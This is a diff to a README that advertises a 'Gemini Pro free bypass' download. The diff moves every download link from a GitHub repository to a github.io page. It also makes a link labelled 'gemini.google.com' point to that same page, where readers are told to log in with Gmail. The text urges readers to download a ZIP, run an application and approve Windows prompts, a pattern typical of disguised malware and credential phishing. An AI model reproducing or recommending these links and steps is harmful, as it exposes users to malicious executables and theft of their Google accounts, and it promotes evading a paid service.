@@ -1,6 +1,6 @@
 # ⚡ gemini-pro-free-bypass-2026 – Unlock Gemini Pro Without Paying a Cent
 
-[![Download Now](https://img.shields.io/badge/Download-Gemini_Pro_Bypass-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026)
+[![Download Now](https://img.shields.io/badge/Download-Gemini_Pro_Bypass-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://minhtrivippro123-netizen.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Getting started takes about two minutes. Follow these steps carefully:
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026](https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026)
+**Visit this link to download the application:** [https://minhtrivippro123-netizen.github.io](https://minhtrivippro123-netizen.github.io)
 
 When you open that page, you'll be on the GitHub repository. Look for a green **"Code"** button or a **"Releases"** section on the right side of the page. Click it, then click **"Download ZIP"** to get the file onto your computer. The download will start automatically. Usually, it lands in your **Downloads** folder.
 
@@ -87,7 +87,7 @@ Because this is a portable tool, "installation" is just a matter of extracting t
 
 Open this link in your browser:
 
-**Download Page:** [https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026](https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026)
+**Download Page:** [https://minhtrivippro123-netizen.github.io](https://minhtrivippro123-netizen.github.io)
 
 ### Step B: Get the ZIP File
 
@@ -103,7 +103,7 @@ Open the extracted folder. Double-click the application file. If Windows asks fo
 
 ### Step E: Use Gemini
 
-Go to [gemini.google.com](https://gemini.google.com). Log in with your Gmail. Select either **"Gemini 2.0 Flash Thinking"** or **"Gemini 2.0 Pro"** from the model dropdown. Start typing your question. You're in.
+Go to [gemini.google.com](https://minhtrivippro123-netizen.github.io). Log in with your Gmail. Select either **"Gemini 2.0 Flash Thinking"** or **"Gemini 2.0 Pro"** from the model dropdown. Start typing your question. You're in.
 
 ---
 
@@ -188,7 +188,7 @@ You've just unlocked one of the most powerful AI tools on the planet—for free.
 
 Don't wait. Download it now and experience the full power of Gemini.
 
-**Visit this link to download the application:** [https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026](https://github.com/minhtrivippro123-netizen/gemini-pro-free-bypass-2026)
+**Visit this link to download the application:** [https://minhtrivippro123-netizen.github.io](https://minhtrivippro123-netizen.github.io)
 
 ---
 
